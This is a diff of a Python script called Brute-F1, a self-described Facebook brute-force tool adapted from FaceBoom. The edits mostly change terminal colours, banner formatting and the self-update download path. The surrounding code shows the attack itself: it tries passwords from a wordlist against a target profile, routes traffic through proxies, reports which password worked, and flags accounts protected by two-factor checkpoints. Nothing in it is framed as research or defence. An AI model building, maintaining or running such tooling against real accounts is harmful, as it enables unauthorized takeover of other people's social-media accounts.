@@ -74,7 +74,7 @@ class FaceBoom(object):
             idre = re.compile('(?<="userID":").*?(?=")')
             con = requests.get(target_profile).text
             idis = idre.search(con).group()
-            print(gr+"\n["+gr+"•"+gr+"]"+gr+" Target Profile"+gr+" ID : "+yl+idis+gr)
+            print(gr+"\n["+yl+"•"+gr+"]"+gr+" Target Profile"+gr+" ID : "+yl+idis+yl)
         except Exception:
             errMsg("Please Check Your Target Profile URL")
             sys.exit(1)
@@ -92,7 +92,7 @@ class FaceBoom(object):
             elif "checkpoint" in self.br.geturl(): return 2
             return 0
         except(KeyboardInterrupt, EOFError):
-            print(rd+"\n["+yl+"•"+rd+"]"+yl+" Aborting"+rd+"..."+wi)
+            print(gr+"\n["+yl+"•"+gr+"]"+yl+" Aborting"+yl+"..."+yl)
             time.sleep(1.5)
             sys.exit(1)
         except Exception as e:
@@ -112,19 +112,19 @@ class FaceBoom(object):
  | |_) | |  | |_| | ||  __/      | |     | |
  |____/|_|   \__,_|\__\___|      |_|     |_|
                                             
-―――― """+yl+"""All praise is for Allah"""+gr+""" ――――
+――――――――――――――――――――― """+yl+"""All praise is for Allah"""+gr+""" ―――――――――――――――――――――
 
 [•] """+yl+"""Brute-F1 : Powerful Facebook Bruteforce Tool"""+gr+"""!
 [•] """+yl+"""Creator : MD Asif Hasan"""+gr+"""         [DetaSploit]
-==================================
+――――――――――――――――――――――――――――――――――――――――――――
 ~ Target      ― """+yl+target+gr+"""
 {}""".format("~ Wordlist    ― "+yl+str(wordlist) if not single_passwd else "~ Password    ― "+yl+str(single_passwd))+gr+"""
 ~ ProxyStatus ― """+str(proxystatus)+wi)
         if not single_passwd:
             print(yl+"""\
-=================================="""+wi+"""
-[•] """+yl+"""Bruteforce"""+rd+""" Attack : """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
-==================================\n"""+wi)
+――――――――――――――――――――――――――――――――――――――――――――"""+gr+"""
+["""+yl+"""•"""+gr+"""] """+yl+"""Bruteforce"""+rd+""" Attack """+gr+""" : """+gr+"""Enabled """+wi+"""[~]"""+yl+"""
+――――――――――――――――――――――――――――――――――――――――――――\n"""+yl)
         else:print("\n")
 
 
@@ -142,7 +142,7 @@ class FaceBoom(object):
         if repoVersion == currentVersion:write("  [•] The Script is Up to Date!\n")
         else:
                 print("  [•] An Update has Been Found : Updating... ")
-                conn.request("GET", "/DetaSploi/Brute-F1/master/brute-f1.py")
+                conn.request("GET", "/DetaSploit/Brute-F1/main/brute-f1.py")
                 newCode = conn.getresponse().read().strip().decode()
                 with open("brute-f1.py", "w") as  brutefScript:
                    brutefScript.write(newCode)
@@ -237,7 +237,7 @@ def Main():
              if proxy.count(".") != 3:
                     errMsg("Invalid IPv4 ["+rd+str(proxy)+yl+"]")
                     sys.exit(1)
-             print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
+             print(gr+"["+yl+"•"+gr+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
              final_proxy = proxy+":8080" if not ":" in proxy else proxy
              if faceboom.check_proxy(final_proxy):
                 faceboom.useProxy = final_proxy
@@ -263,20 +263,20 @@ def Main():
                 if retCode:
                     sys.stdout.write(wi+" Login :"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
-                    print(wi+"["+gr+"•"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
+                    print(gr+"["+yl+"•"+gr+"] Password ["+gr+passwd+wi+"]"+gr+" Is Correct :)")
                     print(wi+"========================="+"="*len(passwd)+"======")
-                    if retCode == 2:print(wi+"["+yl+"•"+wi+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
+                    if retCode == 2:print(gr+"["+yl+"•"+gr+"]"+yl+" Warning : This Account Using ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+"!")
                     break
                 else:
                     sys.stdout.write(yl+" Login :"+rd+" Failed\n")
                     loop = loop + 1 if not single_passwd else "~"
         else:
                 if single_passwd:
-                    print(yl+"\n["+rd+"•"+yl+"] Sorry : "+wi+"The Password [ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
-                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Password or Wordlist "+gr+":)"+wi)
+                    print(gr+"\n["+yl+"•"+gr+"] "+rd+"Sorry : "+gr+"The Password ["+yl+passwd+gr+"] Is Not Correct"+rd+":("+rd)
+                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Password or Wordlist "+gr+":)"+gr)
                 else:
-                    print(yl+"\n["+rd+"•"+yl+"] Sorry : "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
-                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+wi)
+                    print(gr+"\n["+yl+"•"+gr+"] "+rd+"Sorry : "+gr+"I Can't Find The Correct Password In ["+yl+wordlist+gr+"] "+rd+":("+rd)
+                    print(gr+"["+yl+"•"+gr+"]"+yl+" Please Try Another Wordlist. "+gr+":)"+gr)
         sys.exit(1)
    else:
        print(parse.usage)
